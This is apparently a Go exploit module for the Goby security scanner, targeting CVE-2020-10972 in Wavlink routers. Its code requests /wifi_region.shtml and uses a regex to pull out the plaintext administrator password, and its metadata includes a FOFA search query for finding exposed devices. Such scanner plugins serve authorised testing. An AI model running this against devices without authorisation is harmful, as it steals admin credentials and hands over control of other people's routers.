package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Wavlink wifi_region.shtml Information Disclosure Vulnerability (CVE-2020-10972)",
    "Description": "<p>WAVLINK WN535K1,Wavlink WN530HG4, Wavlink WN531G3, and others are wireless network signal expanders from China's Wavlink technology company.</p><p>Several WAVLINK models, such as WAVLINK WN535K1, Wavlink WN530HG4, Wavlink WN531G3 have info leak vulnerabilities. An attacker could obtain the administrator password.</p>",
    "Product": "wavlink_router",
    "Homepage": "https://www.wavlink.com/",
    "DisclosureDate": "2020-05-07",
    "Author": "2075068490@qq.com",
    "FofaQuery": "title=\"Wi-Fi APP Login\" ",
    "GobyQuery": "title=\"Wi-Fi APP Login\" ",
    "Level": "2",
    "Impact": "<p>An attacker can obtain the administrator password of the device through this vulnerability, thereby controlling the device.</p>",
    "Recommendation": "<p>The manufacturer has released a solution, please upgrade to the latest version，<a href=\"https://www.wavlink.com/en_us/firmware.html\">https://www.wavlink.com/en_us/firmware.html</a></p>",
    "References": [
        "https://fofa.info"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "loginPassword",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2020-10972"
    ],
    "CNNVD": [
        "CNNVD-202005-272"
    ],
    "CNVD": [
        "CNVD-2020-41784"
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Wavlink 路由器 wifi_region.shtml 文件信息泄露漏洞（CVE-2020-10972）",
            "Product": "wavlink-router",
            "Description": "<p>WAVLINK WN535K1, Wavlink WN530HG4, Wavlink WN531G3 等都是来自中国WAVLINK技术公司的无线网络信号扩展器。</p><p>WAVLINK WN535K1, Wavlink WN530HG4, Wavlink WN531G3 等多个型号存在信息泄露漏洞。攻击者可利用该漏洞获取页面源代码中明文形式的当前管理员密码。</p>",
            "Recommendation": "<p>厂商已发布解决方案，请升级至最新版本，<a href=\"https://www.wavlink.com/en_us/firmware.html\" target=\"_blank\">https://www.wavlink.com/en_us/firmware.html</a><br></p>",
            "Impact": "<p>攻击者可以通过该漏洞得到设备的管理员密码，进而控制设备。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Wavlink wifi_region.shtml Information Disclosure Vulnerability (CVE-2020-10972)",
            "Product": "wavlink_router",
            "Description": "<p>WAVLINK WN535K1,Wavlink WN530HG4, Wavlink WN531G3, and others are wireless network signal expanders from China's Wavlink technology company.</p><p>Several WAVLINK models, such as WAVLINK WN535K1, Wavlink WN530HG4, Wavlink WN531G3 have info leak vulnerabilities. An attacker could obtain the administrator password.</p>",
            "Recommendation": "<p>The manufacturer has released a solution, please upgrade to the latest version，<a href=\"https://www.wavlink.com/en_us/firmware.html\" target=\"_blank\">https://www.wavlink.com/en_us/firmware.html</a><br></p>",
            "Impact": "<p>An attacker can obtain the administrator password of the device through this vulnerability, thereby controlling the device.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10878"
}`

	sendSiteIdPayload521dwq1 := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewGetRequestConfig("/wifi_region.shtml")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			resp, err := sendSiteIdPayload521dwq1(hostInfo)
			return err == nil && resp.StatusCode == 200 && regexp.MustCompile(`var syspasswd="(.*?)";`).MatchString(resp.Utf8Html)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "loginPassword" {
				resp, err := sendSiteIdPayload521dwq1(expResult.HostInfo)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "var syspasswd=") {
					reg := regexp.MustCompile(`var syspasswd="(.*?)";`)
					result := reg.FindStringSubmatch(resp.Utf8Html)
					if len(result) > 0 {
						expResult.Output += "Login Password: " + result[1]
						expResult.Success = true
					}
					return expResult
				}
			}
			return expResult
		},
	))
}
